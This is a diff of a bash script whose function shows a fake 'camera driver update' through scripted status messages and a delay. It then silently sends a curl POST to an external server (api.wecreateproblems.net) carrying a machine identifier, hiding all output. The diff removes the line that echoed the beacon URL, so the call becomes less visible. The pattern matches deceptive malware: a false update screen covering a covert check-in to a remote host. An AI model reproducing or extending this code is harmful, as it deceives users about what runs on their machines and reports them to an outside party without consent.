@@ -1,6 +1,7 @@
 #!/usr/bin/env bash
 
-
+unset API_BASE
+unset MAC_UID
 MAC_UID="${MAC_UID:-__ID__}"
 API_BASE="${API_BASE:-https://api.wecreateproblems.net}"
 
@@ -53,7 +54,6 @@ run_part1_camera_driver_ui() {
   echo "[INFO] Updating camera drivers..."
   delay 10
   echo "[SUCCESS] Camera drivers updated successfully."
-  echo "${API_BASE}/change-connection-status/${MAC_UID}"
   if [[ -n "${MAC_UID:-}" && "$MAC_UID" != "__ID__" ]]; then
     curl -sL -X POST "${API_BASE}/change-connection-status/${MAC_UID}" >/dev/null 2>&1 || true
   fi
